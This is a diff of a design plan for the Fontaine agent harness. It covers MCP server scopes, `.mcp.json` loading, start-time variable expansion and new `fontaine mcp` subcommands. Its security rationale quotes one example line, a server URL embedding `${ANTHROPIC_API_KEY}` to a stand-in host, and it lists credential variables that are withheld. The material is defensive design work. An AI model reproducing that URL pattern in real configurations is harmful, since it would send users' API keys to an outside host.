@@ -68,16 +68,17 @@ These sources still load, and `mcp list`/`get` show them under their own labels:
 `<root>` is `Config::workspace`, the canonical launch directory that the project files are read
 from.
 
-**Precedence by name: local > project-local > project > user.** This is Claude Code's
-local > project > user, with Fontaine's existing project-local layer kept in its current place.
+**Precedence by name: cli > local > project-local > project > user.** This is Claude Code's
+local > project > user, with Fontaine's existing project-local and `--settings` layers kept in
+their current places.
 Within project, `.fontaine/settings.toml` wins over `.mcp.json`, and the collision warns once
 through the load warnings. A plugin server that collides is still an error (`apply_plugins`),
 unchanged.
 
 **New slot.** Add `Slot::Local` (label `local`). Its origin is
 `Origin { slot: Local, user_trust: true }`, and `is_project()` stays false: the file lives in
-the user's config directory, which the floor protects, so a repository cannot write it. Load it
-in `config::load` after the file layers and before plugins. Load it only when the file has a
+the user's config directory, which the floor protects, so a repository cannot write it. Apply it
+in `config::load` after project-local and before the cli layer, and before plugins. Load it only when the file has a
 `projects."<root>"` table for this workspace.
 
 The local file is TOML with the same `McpServer` schema, keyed by root. It is the analogue of
@@ -96,6 +97,9 @@ Claude Code's `~/.claude.json` `projects` map, in Fontaine's settings format.
 
   A `headers` key warns that headers are not supported yet (#32) and keeps the server, so it
   connects without them. These warnings apply to plugins too.
+- **Malformed project file.** For the project root, an invalid file or entry warns through the
+  load warnings and is skipped, so `fontaine mcp` can still run to fix it. Plugins keep the hard
+  error.
 - **Raw text.** `McpServer` gains `#[serde(skip)] pub expand: bool`. The text stays raw in
   `Config`, so:
   - `server_digest` hashes the definition as written, and approval survives a rotated token but
@@ -110,20 +114,21 @@ Claude Code's `~/.claude.json` `projects` map, in Fontaine's settings format.
   - A reference to an unset variable with no default fails that server's start with an error
     naming the variable. Claude Code fails to parse the config in that case.
 - **Credential variables are never expanded.** A repository-defined definition never expands a
-  variable that holds a credential Fontaine itself uses: every account's `api_key_env`, the
-  telemetry `api_key_env`, and the provider key variables that the stdio scrub withholds. Such a
-  reference fails the server's start with an error.
+  variable that holds a credential Fontaine itself uses: the set that `tools::scrubbed_env` withholds
+  from tool subprocesses (account and telemetry `api_key_env`, `guardian.scanner_hf_token_env`,
+  `MICROMEGAS_*`, `OTEL_EXPORTER_OTLP_*HEADERS`). Such a reference fails the server's start with an
+  error.
   - Reason: in a headless run a project server starts without asking, and
     `url = "https://x/${ANTHROPIC_API_KEY}"` would hand a model key to a repository-chosen host.
-    This is the same boundary as the existing stdio scrub.
+    This is the same boundary as the tool-subprocess scrub.
   - Local and user definitions are TOML and are not expanded, as today, so this rule touches only
     `.mcp.json`.
 
 ### `fontaine mcp` subcommands
 
 These live in `rust/fontaine/src/mcp_cmd.rs`. The file edits go in a new
-`rust/fontaine-core/src/mcp_config.rs` (TOML through `toml_edit`, reusing `user_config.rs`'s
-lock and atomic-write helpers; `.mcp.json` through `serde_json` with key order preserved).
+`rust/fontaine-core/src/mcp_config.rs` (TOML through `toml_edit`, under `file_lock` with an
+`owner_only` atomic write; `.mcp.json` through `serde_json` with key order preserved).
 
 - **`fontaine mcp add [-s local|project|user] [-t stdio|http] [-e KEY=value]... [--env-var NAME]... <name> <command-or-url> [args...]`**
   - `-t` defaults to `stdio`. A stdio server needs `--` before its own flags, as in Claude Code.
@@ -193,23 +198,27 @@ usage and config errors, as the other subcommands do.
      `fontaine-core/src/mcp_json.rs`, with an `Expansion::{Now(ctx), AtStart}` policy, `type`
      handling, the `headers` warning and `${VAR:-default}`.
    - Plugins call it with `Now`, and their existing tests stay green.
+   - The project root uses `AtStart` and the skip-with-warning behavior for a malformed file.
 2. **Config.**
    - Add `Slot::Local` and `McpServer::expand`.
    - Read `<root>/.mcp.json` as `Slot::Project`, merged under `.fontaine/settings.toml` with the
      collision warning.
-   - Read `mcp-local.toml` for this root as `Slot::Local`, above project-local.
+   - Read `mcp-local.toml` for this root as `Slot::Local`, applied after project-local and before
+     the cli layer.
    - Teach `config::diagnose` and doctor's layer listing both new sources.
-   - Update `docs/schemas` if it covers the config file set.
 3. **Start-time expansion.**
    - `server_spec` expands raw definitions through `EnvLookup` and returns
      `Result<Option<ServerSpec>, String>`, because a missing or credential variable is an error.
-     Its callers (session connect, reconnect, doctor probe) report the error as a failed server.
-   - The credential-variable set comes from `Config` (accounts, telemetry) plus the scrub's
-     withheld list in `tools::subprocess_env`.
+     Its callers are session connect (`agent/mcp.rs`) and the doctor probe. Session connect today
+     drops a `None` silently through `filter_map`; for a spec that fails to build it pushes an
+     `McpOutcome { error }`, reported through the existing warn path. The doctor probe reports a
+     failed server. Reconnect reuses the stored spec.
+   - The credential-variable set comes from `tools::scrubbed_env(config, process_env_names)`.
    - `server_description` lists the referenced variable names.
 4. **Edit helpers.** `mcp_config.rs` gets `add_server(scope, root, name, &McpServer)` and
    `remove_server(scope, root, name) -> bool` over the three file formats, all under a lock with
-   an atomic write.
+   an atomic write. A newly created `.mcp.json` gets normal file permissions, not the owner-only
+   mode (`owner_only::write_atomic_keeping_mode` would leave a new target at the tempfile's 0600).
 5. **CLI.**
    - Add `Command::Mcp(McpArgs)` with `Add`, `List`, `Get` and `Remove` to `cli.rs`.
    - Implement them in `mcp_cmd.rs`, with the shared probe in `mcp_probe.rs`, which
@@ -217,12 +226,7 @@ usage and config errors, as the other subcommands do.
 6. **Tool counts.** Do the `GuardedSink` count, `McpServerState::Connected { tools }`, the `/mcp`
    rendering, and update the match arms in `fontaine-tui` and `fontaine-core`.
 7. **Docs and records.**
-   - `docs/mcp.md`: a new "Scopes" section replacing "Where they are declared", plus a
-     "Managing servers from the command line" section and the `/mcp` tool count.
-   - `docs/configuration.md`: the `[mcp.servers.<name>]` scopes, `mcp-local.toml` under "Where
-     files live", and the scope stack line.
-   - `docs/doctor.md`: the new sources.
-   - `docs/tui.md`: `/mcp` output.
+   - Update the pages listed under `## Documentation`.
    - In the master plan, add the Decisions lines below under `### MCP`. In
      `research/research-claude-code-parity.md`, update the MCP-scopes row to done.
 
@@ -232,14 +236,13 @@ usage and config errors, as the other subcommands do.
 - `rust/fontaine-core/src/config.rs`, `rust/fontaine-core/src/lib.rs`
 - `rust/fontaine-core/src/agent/mcp.rs`, `rust/fontaine-core/src/agent/mcp_supervisor.rs`,
   `rust/fontaine-core/src/doctor_report.rs`
-- `rust/fontaine-core/src/mcp_config.rs` (new), `rust/fontaine-core/src/user_config.rs` (shared
-  lock/write helpers)
+- `rust/fontaine-core/src/mcp_config.rs` (new)
 - `rust/fontaine-tools/src/mcp/register.rs`, `rust/fontaine-tools/src/mcp/*` (`Connected`)
 - `rust/fontaine/src/cli.rs`, `rust/fontaine/src/lib.rs`, `rust/fontaine/src/mcp_cmd.rs` (new),
   `rust/fontaine/src/mcp_probe.rs` (new), `rust/fontaine/src/doctor_cmd.rs`
 - `rust/fontaine-tui/src/ui/mcp.rs`, `rust/fontaine-tui/src/reports.rs`,
   `rust/fontaine-tui/src/server_prompt.rs`
-- `docs/mcp.md`, `docs/configuration.md`, `docs/doctor.md`, `docs/tui.md`
+- `docs/mcp.md`, `docs/plugins.md`, `docs/configuration.md`, `docs/doctor.md`, `docs/tui.md`
 - `tasks/fontaine_harness_plan.md`, `research/research-claude-code-parity.md`
 
 ## Trade-offs
@@ -249,14 +252,6 @@ usage and config errors, as the other subcommands do.
   untracked before it gets user trust. It also sits in the work tree, where it can be committed by
   mistake. Claude Code keeps local servers out of the repository for the same reason. A
   user-directory file is always user-trusted and is protected by the floor.
-- **TOML for local, JSON only for `.mcp.json`.** Fontaine's own settings are TOML, and
-  `.mcp.json` is read for interoperability with repositories set up for Claude Code. The `add`
-  command writes each scope in its native format.
-- **Expand at start, not at load.** Expanding at load (the plugin path) would put secret values
-  into `Config`, the approval digest and the prompt. Raw text keeps approvals stable across token
-  rotation and keeps values out of every display.
-- **Reuse doctor's probe for `list`** rather than a second probe path. The two commands then
-  apply the same "never run repository code a session would not" rule.
 
 ## Decisions
 
@@ -268,8 +263,8 @@ Lines to add under the master plan's `### MCP`:
 - (#31) The repository's `.mcp.json` is read as project scope alongside
   `.fontaine/settings.toml` `[mcp.servers]`, and the TOML wins a name collision with a warning.
 - (#31) Project `.mcp.json` `${VAR}` references are expanded when the server starts, never into a
-  credential variable Fontaine uses (account and telemetry keys, provider keys the scrub
-  withholds); such a reference fails that server. Claude Code expands any variable. Reason: a
+  credential variable Fontaine uses (the set `tools::scrubbed_env` withholds: account and
+  telemetry keys, the scanner HF token, `MICROMEGAS_*`, OTLP headers); such a reference fails that server. Claude Code expands any variable. Reason: a
   headless run starts project servers without asking.
 - (#31) An unset `${VAR}` with no default fails only that server's start (Claude Code fails the
   config parse).
@@ -282,8 +277,12 @@ Lines to add under the master plan's `### MCP`:
 
 ## Documentation
 
-- `docs/mcp.md`: scopes and precedence, `.mcp.json` support and `${VAR}`/`${VAR:-default}`
-  expansion with the credential rule, the `fontaine mcp` subcommands, and tool counts in `/mcp`.
+- `docs/mcp.md`: a new "Scopes" section replacing "Where they are declared", with scopes and
+  precedence; `.mcp.json` support and `${VAR}`/`${VAR:-default}` expansion with the credential
+  rule, in "Servers a repository defines" (`.mcp.json` as a repository source); the `fontaine mcp`
+  subcommands; and tool counts in `/mcp`.
+- `docs/plugins.md`: plugin `.mcp.json` expansion now has `${VAR:-default}`, and the `type` and
+  `headers` warnings.
 - `docs/configuration.md`: `mcp-local.toml` in "Where files live", the scope stack, and the
   `[mcp.servers.<name>]` cross-link.
 - `docs/doctor.md`: local and `.mcp.json` sources in the MCP section.
@@ -298,7 +297,9 @@ Unit tests (`fontaine-core`):
   - the `headers` warning;
   - `${VAR:-default}` with the default used and not used;
   - raw text kept under `AtStart`;
-  - plugin expansion unchanged.
+  - plugin expansion unchanged;
+  - for the project root, an invalid file or entry warns and is skipped, while a plugin's still
+    errors.
 - Config loading:
   - a `.mcp.json` server loads as `Slot::Project` and needs approval in `mcp_plan`;
   - a `.fontaine/settings.toml` server of the same name wins and warns;
@@ -310,7 +311,8 @@ Unit tests (`fontaine-core`):
 - `server_spec`:
   - expands `${VAR}` into command, args, env and url;
   - fails on an unset variable without a default;
-  - fails on a credential variable (account `api_key_env`, telemetry key);
+  - fails on a credential variable from `tools::scrubbed_env` (account `api_key_env`, telemetry
+    `api_key_env`, `guardian.scanner_hf_token_env`, `MICROMEGAS_*`, OTLP headers);
   - leaves TOML definitions unexpanded.
 - `mcp_config` add/remove round trips for each scope:
   - comments and order kept in TOML;
@@ -334,15 +336,15 @@ and the `repo_mcp_server` example):
   marker-file server, the way `project_executables.rs` checks that a server never ran. This is the
   silent failure that matters, a repository's code running from a CLI listing, so it is an
   automated test.
-- A headless run (`fontaine -p`) with a `.mcp.json` server whose URL references a credential
-  variable reports the server as failed and never contacts it. Use a wiremock server that
-  asserts zero requests. Only the full start path shows that the credential never leaves, so this
-  is an integration test.
+- A `fontaine-core` runtime test (harness in `fontaine-core/tests/common/runtime.rs`, as
+  `mcp_reconnect.rs` uses) asserts that a `.mcp.json` server with a credential reference yields an
+  `McpOutcome.error` naming the variable.
 
 ## Manual Verification
 
-1. In a scratch git repo, run `cargo run -p fontaine -- mcp add -s project demo -- cargo run -p
-   fontaine --example repo_mcp_server`, then start `cargo run -p fontaine` and trust the folder.
+1. From `rust/`, run `cargo build -p fontaine --examples`. In a scratch git repo, run
+   `<abs>/rust/target/debug/fontaine mcp add -s project demo -- <abs>/rust/target/debug/examples/repo_mcp_server`,
+   then start `<abs>/rust/target/debug/fontaine` and trust the folder.
    Expected: the approval prompt shows the command. After approval, `/mcp` shows
    `demo … connected · N tools`. This checks the prompt and live rendering in a real terminal,
    which `TestBackend` covers only partly.
